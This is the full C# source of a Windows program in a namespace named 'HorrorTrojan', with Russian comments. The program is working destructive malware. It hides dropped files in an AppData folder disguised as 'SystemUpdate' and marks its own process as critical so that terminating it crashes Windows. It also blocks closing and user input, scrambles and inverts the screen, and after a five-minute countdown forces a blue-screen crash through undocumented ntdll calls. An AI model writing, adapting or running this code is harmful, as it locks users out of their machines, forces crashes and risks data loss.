using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;
using System.Diagnostics;
using System.Reflection;
using WMPLib;

namespace HorrorTrojan
{
    public partial class MainInterface : Form
    {
        [DllImport("user32.dll")]
        private static extern IntPtr GetDesktopWindow();
        [DllImport("user32.dll")]
        private static extern IntPtr GetWindowDC(IntPtr hwnd);
        [DllImport("user32.dll")]
        private static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);
        [DllImport("gdi32.dll")]
        private static extern bool BitBlt(IntPtr hdcDest, int x1, int y1, int w1, int h1, IntPtr hdcSrc, int x2, int y2, int dw);
        [DllImport("user32.dll")]
        private static extern bool GetWindowRect(IntPtr hwnd, out RECT rect);
        [DllImport("ntdll.dll")]
        private static extern uint RtlAdjustPrivilege(int privilege, bool enable, bool currentThread, out bool enabled);
        [DllImport("ntdll.dll")]
        private static extern uint NtRaiseHardError(uint errorStatus, uint numberOfParameters, IntPtr unicodeStringParameterMask,
            IntPtr parameters, uint validResponseOptions, out uint response);
        [DllImport("ntdll.dll")]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        [StructLayout(LayoutKind.Sequential)]
        public struct RECT { public int Left, Top, Right, Bottom; }
        private const int NORMAL = 0x00CC0020;
        private const int INVERT = 0x00040000;

        private System.Windows.Forms.Timer mainTimer = new System.Windows.Forms.Timer();
        private System.Windows.Forms.Timer glitchTimer = new System.Windows.Forms.Timer();
        private System.Windows.Forms.Timer videoTimer = new System.Windows.Forms.Timer();
        private System.Windows.Forms.Timer formInvertTimer = new System.Windows.Forms.Timer();

        private int timeLeft = 300;
        private bool isGlitchActive = false;
        private bool isVideoActive = false;
        private bool isFormInverted = false;
        private Random rnd = new Random();
        private string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SystemUpdate");
        private Image gifImage;
        private Image originalGifImage;
        private WindowsMediaPlayer musicPlayer;
        private bool isDragging = false;
        private Point dragStartPoint;
        private Color originalBackColor;

        private string[] videoFiles = { "vd.gif", "kj.gif", "kf.gif" };

        public MainInterface()
        {
            InitializeComponent();
            this.Load += MainInterface_Load;
            originalBackColor = this.BackColor;

            // ПЕРЕМЕЩЕНИЕ ФОРМЫ (через глобальный перехват)
            this.MouseDown += MainInterface_MouseDown;
            this.MouseMove += MainInterface_MouseMove;
            this.MouseUp += MainInterface_MouseUp;
            this.pictureBox.MouseDown += MainInterface_MouseDown;
            this.pictureBox.MouseMove += MainInterface_MouseMove;
            this.pictureBox.MouseUp += MainInterface_MouseUp;
            this.bottomPanel.MouseDown += MainInterface_MouseDown;
            this.bottomPanel.MouseMove += MainInterface_MouseMove;
            this.bottomPanel.MouseUp += MainInterface_MouseUp;
            this.timerLabel.MouseDown += MainInterface_MouseDown;
            this.timerLabel.MouseMove += MainInterface_MouseMove;
            this.timerLabel.MouseUp += MainInterface_MouseUp;

            this.WindowState = FormWindowState.Normal;
            this.Visible = true;
            this.Show();
            this.BringToFront();
            this.Activate();
        }

        protected override CreateParams CreateParams
        {
            get
            {
                CreateParams cp = base.CreateParams;
                cp.ExStyle |= 0x00000008;
                cp.ExStyle |= 0x02000000;
                cp.ExStyle |= 0x00000020;
                return cp;
            }
        }

        private void MainInterface_Load(object sender, EventArgs e)
        {
            try
            {
                if (!Directory.Exists(appDataPath))
                    Directory.CreateDirectory(appDataPath);

                ExtractMediaFile("hr.gif");
                ExtractMediaFile("dv.mp3");
                ExtractMediaFile("vd.gif");
                ExtractMediaFile("kj.gif");
                ExtractMediaFile("kf.gif");

                LoadResources();
                StartTimers();
                SetupProtection();
                PlayMusic();

                this.Visible = true;
                this.Show();
                this.BringToFront();
                this.Activate();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Ошибка: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void ExtractMediaFile(string fileName)
        {
            try
            {
                string filePath = Path.Combine(appDataPath, fileName);
                if (File.Exists(filePath))
                    return;

                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(fileName))
                {
                    if (stream != null)
                    {
                        byte[] data = new byte[stream.Length];
                        stream.Read(data, 0, data.Length);
                        File.WriteAllBytes(filePath, data);
                        File.SetAttributes(filePath, FileAttributes.Hidden | FileAttributes.ReadOnly);
                    }
                }
            }
            catch { }
        }

        private void LoadResources()
        {
            try
            {
                string gifPath = Path.Combine(appDataPath, "hr.gif");
                if (File.Exists(gifPath))
                {
                    // ЗАГРУЖАЕМ GIF ПРЯМО ИЗ ФАЙЛА (НЕ КЛОНИРУЕМ!)
                    originalGifImage = Image.FromFile(gifPath);
                    gifImage = originalGifImage;
                    this.pictureBox.Image = gifImage;
                    this.pictureBox.SizeMode = PictureBoxSizeMode.StretchImage;
                    ImageAnimator.Animate(gifImage, (s, ev) => { this.pictureBox.Invalidate(); });
                }
                else
                {
                    this.pictureBox.BackColor = Color.Red;
                }
            }
            catch
            {
                this.pictureBox.BackColor = Color.Red;
            }
        }

        private void PlayMusic()
        {
            try
            {
                string musicPath = Path.Combine(appDataPath, "dv.mp3");
                if (File.Exists(musicPath))
                {
                    musicPlayer = new WindowsMediaPlayer();
                    musicPlayer.URL = musicPath;
                    musicPlayer.settings.autoStart = true;
                    musicPlayer.settings.setMode("loop", true);
                    musicPlayer.controls.play();
                }
            }
            catch { }
        }

        private void StartTimers()
        {
            mainTimer.Interval = 1000;
            mainTimer.Tick += MainTimer_Tick;
            mainTimer.Start();

            glitchTimer.Interval = rnd.Next(3000, 8000);
            glitchTimer.Tick += GlitchTimer_Tick;
            glitchTimer.Start();

            videoTimer.Interval = rnd.Next(30000, 60000);
            videoTimer.Tick += VideoTimer_Tick;
            videoTimer.Start();

            formInvertTimer.Interval = rnd.Next(10000, 20000);
            formInvertTimer.Tick += FormInvertTimer_Tick;
            formInvertTimer.Start();
        }

        private void FormInvertTimer_Tick(object sender, EventArgs e)
        {
            if (!isVideoActive && !isGlitchActive)
            {
                InvertForm();
                formInvertTimer.Interval = rnd.Next(10000, 20000);
            }
        }

        private void InvertForm()
        {
            try
            {
                if (isFormInverted)
                {
                    // Возвращаем нормальные цвета
                    this.BackColor = originalBackColor;
                    this.pictureBox.BackColor = Color.Black;
                    this.bottomPanel.BackColor = Color.Black;
                    this.timerLabel.BackColor = Color.Black;
                    this.timerLabel.ForeColor = Color.Red;
                    
                    // Возвращаем оригинальный GIF (перезагружаем)
                    if (originalGifImage != null)
                    {
                        ImageAnimator.StopAnimate(gifImage, (s, ev) => { });
                        gifImage = originalGifImage;
                        this.pictureBox.Image = gifImage;
                        ImageAnimator.Animate(gifImage, (s, ev) => { this.pictureBox.Invalidate(); });
                    }
                    
                    isFormInverted = false;
                }
                else
                {
                    // Инвертируем цвета формы
                    this.BackColor = Color.White;
                    this.pictureBox.BackColor = Color.White;
                    this.bottomPanel.BackColor = Color.White;
                    this.timerLabel.BackColor = Color.White;
                    this.timerLabel.ForeColor = Color.Cyan;
                    
                    // Инвертируем GIF (СОЗДАЁМ НОВЫЙ BITMAP)
                    if (gifImage != null)
                    {
                        ImageAnimator.StopAnimate(gifImage, (s, ev) => { });
                        Image invertedGif = InvertImage(gifImage);
                        gifImage = invertedGif;
                        this.pictureBox.Image = gifImage;
                        ImageAnimator.Animate(gifImage, (s, ev) => { this.pictureBox.Invalidate(); });
                    }
                    
                    isFormInverted = true;
                }
            }
            catch { }
        }

        private Image InvertImage(Image original)
        {
            try
            {
                // СОЗДАЁМ НОВОЕ ИЗОБРАЖЕНИЕ С ИНВЕРСИЕЙ
                Bitmap bmp = new Bitmap(original.Width, original.Height);
                using (Graphics g = Graphics.FromImage(bmp))
                {
                    ColorMatrix colorMatrix = new ColorMatrix(new float[][]
                    {
                        new float[] {-1, 0, 0, 0, 0},
                        new float[] {0, -1, 0, 0, 0},
                        new float[] {0, 0, -1, 0, 0},
                        new float[] {0, 0, 0, 1, 0},
                        new float[] {1, 1, 1, 0, 1}
                    });
                    
                    ImageAttributes attributes = new ImageAttributes();
                    attributes.SetColorMatrix(colorMatrix);
                    
                    g.DrawImage(original, new Rectangle(0, 0, original.Width, original.Height), 
                                0, 0, original.Width, original.Height, GraphicsUnit.Pixel, attributes);
                }
                return bmp;
            }
            catch
            {
                return original;
            }
        }

        private void MainTimer_Tick(object sender, EventArgs e)
        {
            timeLeft--;
            if (timeLeft < 0) timeLeft = 0;

            int minutes = timeLeft / 60;
            int seconds = timeLeft % 60;
            timerLabel.Text = $"{minutes}:{seconds:D2}";

            if (timeLeft == 0)
            {
                mainTimer.Stop();
                glitchTimer.Stop();
                videoTimer.Stop();
                formInvertTimer.Stop();
                TriggerBSOD();
            }
        }

        private void GlitchTimer_Tick(object sender, EventArgs e)
        {
            if (!isVideoActive && !isGlitchActive)
            {
                isGlitchActive = true;
                glitchTimer.Interval = rnd.Next(3000, 8000);
                
                if (rnd.Next(0, 3) == 0)
                    StartInvertEffect();
                else
                    StartGlitchEffect();
            }
        }

        private void VideoTimer_Tick(object sender, EventArgs e)
        {
            if (!isGlitchActive && !isVideoActive)
            {
                isVideoActive = true;
                videoTimer.Interval = rnd.Next(30000, 60000);
                ShowRandomVideo();
            }
        }

        private void StartGlitchEffect()
        {
            try
            {
                glitchTimer.Stop();
                var glitchThread = new Thread(() =>
                {
                    try
                    {
                        for (int i = 0; i < 150; i++)
                        {
                            IntPtr hwnd = GetDesktopWindow();
                            IntPtr hdc = GetWindowDC(hwnd);
                            GetWindowRect(hwnd, out RECT rect);

                            int x = rnd.Next(0, Screen.PrimaryScreen.Bounds.Width);
                            int y = rnd.Next(0, Screen.PrimaryScreen.Bounds.Height);
                            int w = rnd.Next(100, 500);
                            int h = rnd.Next(100, 500);

                            BitBlt(hdc, x, y, w, h, hdc, rnd.Next(0, 100), rnd.Next(0, 100), NORMAL);
                            ReleaseDC(hwnd, hdc);
                            Thread.Sleep(100);
                        }
                    }
                    catch { }
                    finally
                    {
                        isGlitchActive = false;
                        glitchTimer.Start();
                    }
                });
                glitchThread.IsBackground = true;
                glitchThread.Start();
            }
            catch { }
        }

        private void StartInvertEffect()
        {
            try
            {
                glitchTimer.Stop();
                var invertThread = new Thread(() =>
                {
                    try
                    {
                        IntPtr hwnd = GetDesktopWindow();
                        IntPtr hdc = GetWindowDC(hwnd);
                        GetWindowRect(hwnd, out RECT rect);

                        for (int i = 0; i < 10; i++)
                        {
                            BitBlt(hdc, 0, 0, rect.Right, rect.Bottom, hdc, 0, 0, INVERT);
                            Thread.Sleep(200);
                            BitBlt(hdc, 0, 0, rect.Right, rect.Bottom, hdc, 0, 0, INVERT);
                            Thread.Sleep(200);
                        }

                        ReleaseDC(hwnd, hdc);
                    }
                    catch { }
                    finally
                    {
                        isGlitchActive = false;
                        glitchTimer.Start();
                    }
                });
                invertThread.IsBackground = true;
                invertThread.Start();
            }
            catch { }
        }

        private void ShowRandomVideo()
        {
            try
            {
                string videoPath = Path.Combine(appDataPath, videoFiles[rnd.Next(videoFiles.Length)]);
                if (!File.Exists(videoPath))
                {
                    isVideoActive = false;
                    videoTimer.Start();
                    return;
                }

                VideoForm videoForm = new VideoForm(videoPath);
                videoForm.Show();

                var closeThread = new Thread(() =>
                {
                    Thread.Sleep(5000);
                    videoForm.BeginInvoke((Action)(() =>
                    {
                        videoForm.Close();
                        isVideoActive = false;
                        videoTimer.Start();
                    }));
                });
                closeThread.IsBackground = true;
                closeThread.Start();
            }
            catch
            {
                isVideoActive = false;
                videoTimer.Start();
            }
        }

        private void SetupProtection()
        {
            try
            {
                SetProcessCritical(true);
            }
            catch { }
        }

        private void SetProcessCritical(bool critical)
        {
            try
            {
                int isCritical = critical ? 1 : 0;
                NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref isCritical, sizeof(int));
            }
            catch { }
        }

        private void TriggerBSOD()
        {
            try
            {
                RtlAdjustPrivilege(19, true, false, out bool _);
                NtRaiseHardError(0xC0000000 | (uint)(DateTime.UtcNow.Ticks & 0xFFFFF), 0, IntPtr.Zero, IntPtr.Zero, 6, out uint _);
            }
            catch { }
        }

        // ===== ПЕРЕМЕЩЕНИЕ ФОРМЫ (ИСПРАВЛЕНО) =====
        private void MainInterface_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                isDragging = true;
                dragStartPoint = new Point(e.X, e.Y);
            }
        }

        private void MainInterface_MouseMove(object sender, MouseEventArgs e)
        {
            if (isDragging)
            {
                Point screenPoint = PointToScreen(e.Location);
                this.Location = new Point(screenPoint.X - dragStartPoint.X, screenPoint.Y - dragStartPoint.Y);
            }
        }

        private void MainInterface_MouseUp(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                isDragging = false;
            }
        }

        protected override void WndProc(ref Message m)
        {
            const int WM_SYSKEYDOWN = 0x0104;
            const int WM_KEYDOWN = 0x0100;
            const int WM_LBUTTONDOWN = 0x0201;
            const int WM_RBUTTONDOWN = 0x0204;
            const int WM_MBUTTONDOWN = 0x0207;
            const int WM_MOUSEMOVE = 0x0200;
            const int WM_SYSCOMMAND = 0x0112;
            const int SC_CLOSE = 0xF060;
            const int SC_MINIMIZE = 0xF020;
            const int SC_MAXIMIZE = 0xF030;

            if (m.Msg == WM_SYSCOMMAND && ((int)m.WParam == SC_CLOSE || (int)m.WParam == SC_MINIMIZE || (int)m.WParam == SC_MAXIMIZE))
            {
                m.Result = IntPtr.Zero;
                return;
            }

            if (m.Msg == WM_SYSKEYDOWN || m.Msg == WM_KEYDOWN ||
                m.Msg == WM_LBUTTONDOWN || m.Msg == WM_RBUTTONDOWN ||
                m.Msg == WM_MBUTTONDOWN || m.Msg == WM_MOUSEMOVE)
            {
                return;
            }
            base.WndProc(ref m);
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing)
            {
                mainTimer?.Dispose();
                glitchTimer?.Dispose();
                videoTimer?.Dispose();
                formInvertTimer?.Dispose();
                gifImage?.Dispose();
                originalGifImage?.Dispose();
                try { musicPlayer?.close(); } catch { }
            }
            base.Dispose(disposing);
        }
    }
}
